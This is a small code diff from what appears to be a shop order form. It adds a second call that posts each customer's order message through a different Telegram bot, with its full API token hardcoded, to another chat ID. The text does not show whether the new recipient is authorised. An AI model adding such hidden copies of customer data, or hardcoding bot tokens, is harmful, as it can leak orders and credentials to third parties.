@@ -1327,6 +1327,11 @@ ${items}
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: '5567924440', text: msg })
     });
+      await fetch('https://api.telegram.org/bot7960727448:AAF0B2mizrzj7sjHP68n-1IcjLoNc6kwVkE/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: '246421345', text: msg })
+    });
 
     Swal.fire('Успех!', 'Ваш заказ отправлен!', 'success');
     
